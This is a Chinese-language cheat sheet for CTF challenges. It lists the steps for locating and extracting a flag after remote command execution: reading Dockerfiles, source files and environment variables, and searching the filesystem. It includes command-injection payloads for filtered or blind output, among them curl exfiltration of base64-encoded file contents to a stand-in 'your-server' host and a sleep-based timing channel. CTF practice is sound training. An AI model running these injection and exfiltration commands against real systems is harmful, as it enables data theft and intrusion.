# Flag 提取方法论

获得命令执行（RCE）后的 flag 提取标准步骤。

## 标准步骤（按顺序执行）

1. **读 Dockerfile**（最优先 — 直接告诉你 flag 写入路径）
```
cat /Dockerfile 2>/dev/null || cat /app/Dockerfile 2>/dev/null
```
典型模式：`RUN echo $FLAG > /FLAG.txt` 或 `COPY flag.txt /flag`

2. **读应用源码**（了解 flag 如何被使用）
```
cat /app/app.py 2>/dev/null; cat /app/index.php 2>/dev/null; cat /var/www/html/index.php 2>/dev/null
```

3. **列出根目录**（注意大小写差异）
```
ls -la / | grep -i flag
```

4. **搜索文件系统**
```
find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null | head -20
```

5. **检查环境变量**
```
env | grep -i flag; echo '---'; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i flag
```

## 常见 flag 位置

| 位置 | 频率 |
|------|------|
| /flag, /flag.txt | 最常见 |
| /FLAG.txt, /FLAG | 大小写变体 |
| /app/flag.txt | 应用目录 |
| 环境变量 FLAG | Docker compose |
| 数据库中 | 需要 SQL 查询 |
| 源码硬编码 | sed 替换 @FLAG@ |

## 输出受限场景

### 命令注入但输出被过滤
- 写入 Web 可访问路径：`cmd; cp /flag.txt /var/www/html/f.txt`
- DNS 外带：`cmd; curl http://your-server/$(cat /flag.txt | base64)`
- 错误信息注入：利用 stderr 不被过滤的特性

### PHP 读取文件
- ❌ `system('cat file.php')` — PHP 引擎会解析输出
- ✅ `echo file_get_contents('file.php')` — 原始内容
- ✅ `highlight_file('file.php')` — 语法高亮显示源码

### 盲 RCE（无回显）
1. 写文件到 Web 路径：`cat /flag > /var/www/html/out.txt`
2. 延时判断：`sleep $(cat /flag | wc -c)` — 响应时间 = flag 长度
3. DNS/HTTP 外带：需要外部服务器接收
